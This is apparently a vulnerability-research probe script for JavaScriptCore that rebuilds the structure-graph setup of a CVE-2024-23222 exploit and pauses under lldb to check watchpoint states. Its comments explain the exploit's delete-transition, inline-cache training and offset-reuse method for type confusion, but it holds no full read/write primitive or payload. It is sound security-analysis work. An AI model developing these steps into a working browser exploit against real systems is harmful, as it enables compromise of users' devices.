// watchpoint-probe.js
//
// Mirrors the exploit's structure-graph setup and pauses at each step so lldb
// can inspect the per-Structure watchpoint state. Run under lldb with the
// companion script watchpoint-probe.lldb, which sets a breakpoint on the
// `marker` host call and dumps:
//   - S->m_transitionWatchpointSet state  (ClearWatchpoint=0 / IsWatched=1 / IsInvalidated=2)
//   - S->rareData()->m_replacementWatchpointSets[offset]->state()  if it exists
//
// What we want to verify:
//   - After divergentObj does `delete p2` at S₂: S₂'s transition watchpoint
//     fires (IsWatched -> IsInvalidated). dfgShouldWatch(S₂) becomes false.
//   - After IC training: (S₂, offset_p1) replacement watchpoint EXISTS in
//     state IsWatched (created by Repatch.cpp:430).
//   - After targetObj does `delete p2` (the race shot): (S₂, offset_p1)
//     replacement watchpoint is STILL IsWatched. delete is a transition;
//     didReplaceProperty fires only on the !isAdded path in JSObjectInlines.h.
//   - After the full S₂→S₆ walk: still IsWatched.
//
// If all four hold, the watchpoint never fires in the exploit's actual path
// and the writeup's claims about "doesn't fire the watchpoint" are vacuously
// true: not because the exploit dodges it, but because the operations the
// exploit performs are categorically invisible to it.

// ─────────────────────────────────────────────────────────────────────────────
// marker(): host function that lldb breaks on. The argument string is just
// for the human reading the lldb output; lldb prints it from the JS frame.
// We use `print` because lldb can break on JSC's debugPrint trivially, but
// to keep the actual stdout clean we route through a dedicated wrapper that
// the lldb script recognizes and the JS side filters out.
//
// In the jsc shell, `$vm` exposes internals when --useDollarVM=1 is set.
// We use $vm.breakpoint() to halt for lldb inspection.
// ─────────────────────────────────────────────────────────────────────────────

// Side-channel for the lldb script: write checkpoint state to a tmpfile.
// stdout is forwarded directly to the terminal in `lldb -b` mode and isn't
// available via process.GetSTDOUT(), so we go through the filesystem instead.
const CHECKPOINT_FILE = "/tmp/wp-checkpoint";
let _ckpt_n = 0;

function structAddr(o) {
    let m = describe(o).match(/Structure (0x[0-9a-f]+)/);
    return m ? m[1] : "0x0";
}

function checkpoint(label, ...objects) {
    let addrs = objects.map(structAddr);
    let line = "[CHECKPOINT " + (_ckpt_n++) + "] " + label + " | " + addrs.join(" | ");
    print(line);
    // writeFile is a jsc-shell builtin (see jsc.cpp). lldb python reads this.
    writeFile(CHECKPOINT_FILE, line + "\n");
    if (typeof $vm !== 'undefined') $vm.breakpoint();
}

// ─────────────────────────────────────────────────────────────────────────────
// Build the structure graph the exploit uses. Same shape as
// cve-2024-23222-rw.js but stripped down to just the structure manipulation.
// ─────────────────────────────────────────────────────────────────────────────

function Ctor() {
    this.p1 = 1.1;        // S₀ → S₁  (offset 0)
}

let trainingArray = [13.37, 13.37, 13.37, 13.37];
let trapArray     = [{}, {}, {}, {}];

let targetObj    = new Ctor();   // at S₁
let divergentObj = new Ctor();   // at S₁
let s2witness    = new Ctor();   // at S₁ — never moves past S₂; lets us read
                                 // S₂'s state even after target/divergent move

targetObj.p2    = trainingArray;  // S₁ → S₂  (carves edge)
divergentObj.p2 = 0x1337;         // follows S₁ → S₂
s2witness.p2    = 0;              // follows S₁ → S₂, then frozen here

// From here on, every checkpoint passes s2witness FIRST so S[0] in the lldb
// dump is always S₂ regardless of where target/divergent have wandered.
checkpoint("0-both-at-S2", s2witness, targetObj, divergentObj);

// ─── divergentObj carves S₂ → S₃ → S₄ → S₅ → S₆ ─────────────────────────────
// THIS is where S₂'s transition watchpoint fires. After this line,
// dfgShouldWatch(S₂) = false because transitionWatchpointSetIsStillValid()
// returns false. The fix's case-1 escape (all structures transition-watched)
// is closed by this single delete.

delete divergentObj.p2;           // S₂ → S₃  ← FIRES S₂'s transition watchpoint
checkpoint("1-divergent-at-S3-CHECK-S2-TRANSITION-INVALIDATED", s2witness, targetObj, divergentObj);

delete divergentObj.p1;           // S₃ → S₄
divergentObj.p1 = trainingArray;  // S₄ → S₅
divergentObj.p2 = 0x1337;         // S₅ → S₆
checkpoint("2-divergent-at-S6", s2witness, targetObj, divergentObj);

// ─── IC training ─────────────────────────────────────────────────────────────
// trigger() reads obj.p1. The IC at that get_by_id site will cache S₂
// (from targetObj) and S₆ (from divergentObj). Each cache install calls
// startWatchingPropertyForReplacements (Repatch.cpp:430 or
// InlineCacheCompiler.cpp:1511), which creates the replacement watchpoint
// set on (S, offset_p1) in state IsWatched.
//
// CRITICAL CHECK: does (S₂, offset_p1)'s replacement watchpoint exist BEFORE
// training? It should NOT — it's created lazily by the IC. After training,
// it should exist in IsWatched state.

noInline(trigger);  // keep it from inlining so the IC site is real
function trigger(obj) {
    return obj.p1;   // ← the get_by_id whose IC creates the watchpoint sets
}

checkpoint("3-pre-IC-training-CHECK-S2-REPLACEMENT-NULL", s2witness, targetObj, divergentObj);

// Train: alternate between the two structures. Need enough iterations to
// promote past LLInt into Baseline JIT where Repatch.cpp kicks in.
for (let i = 0; i < 200; i++) {
    trigger(i & 1 ? divergentObj : targetObj);
}

checkpoint("4-post-IC-training-CHECK-S2-REPLACEMENT-ISWATCHED", s2witness, targetObj, divergentObj);

// ─── The race shot: delete targetObj.p2 ─────────────────────────────────────
// This is what happens at iteration PIVOT in the real exploit.
// HYPOTHESIS: this is a transition (S₂ → S₃), goes through
// JSObject::deleteProperty → Structure::removePropertyTransition →
// didTransitionFromThisStructure(S₂). It fires S₂'s transition watchpoint
// (already invalidated by divergentObj, so this is a no-op fire). It does
// NOT call didReplaceProperty. (S₂, offset_p1) replacement wp stays IsWatched.

delete targetObj.p2;
checkpoint("5-target-at-S3-CHECK-S2-REPLACEMENT-STILL-ISWATCHED", s2witness, targetObj, divergentObj);

// ─── The post-install swap dance ─────────────────────────────────────────────
// targetObj walks S₃ → S₄ → S₅ → S₆.
// HYPOTHESIS: none of these fire (S₂, offset_p1) or (S₆, offset_p1) replacement
// watchpoints.
//   delete p1   : transition (S₃→S₄), no didReplaceProperty
//   p1 = trap   : ADD at S₄ (which has no p1), isAdded=true, no didReplaceProperty
//   p2 = 1      : ADD at S₅, same
// Caveat: does the p1=trap step land at the same OFFSET as S₂'s p1? If S₅
// puts p1 at a different offset, the runtime read in the compiled code (which
// has S₂'s offset baked in) reads the wrong slot. The exploit assumes offset
// reuse. Let's verify by checking the structure's property table.

delete targetObj.p1;
checkpoint("6a-target-at-S4-deleted-p1", s2witness, targetObj);

targetObj.p1 = trapArray;
checkpoint("6b-target-at-S5-added-p1-CHECK-OFFSET", s2witness, targetObj);

targetObj.p2 = 1;
checkpoint("6c-target-at-S6-CHECK-S6-REPLACEMENT-STILL-ISWATCHED", s2witness, targetObj, divergentObj);

// ─── The control: an actual replacement ──────────────────────────────────────
// Now do something that SHOULD fire the watchpoint, to confirm we're reading
// state correctly. divergentObj is at S₆ with p1 = trainingArray. If we do
// `divergentObj.p1 = 42` (no delete), that's a replacement at S₆, !isAdded,
// didReplaceProperty(offset_p1) called. (S₆, offset_p1) should go IsInvalidated.

divergentObj.p1 = 42;
checkpoint("7-CONTROL-true-replacement-at-S6-CHECK-INVALIDATED", s2witness, divergentObj);

print("[DONE]");
